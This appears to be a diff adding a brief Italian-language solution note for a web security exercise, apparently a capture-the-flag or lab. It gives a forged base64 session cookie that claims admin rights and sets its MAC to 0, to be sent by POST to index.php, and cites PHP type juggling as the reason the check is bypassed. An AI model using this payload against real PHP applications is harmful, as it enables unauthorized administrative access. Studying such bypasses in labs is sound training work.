@@ -1,0 +1,7 @@
+---> Fare mandare un pacchetto HTTP con il metodo POST a index.php
+
+ses=eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IlRydWUiLCJNQUMiOjB9
+
+{"User":"whocares","Admin":"True","MAC":0}
+
+--> Vedere Slides sul "PHP Juggling" per capire meglio il bypass
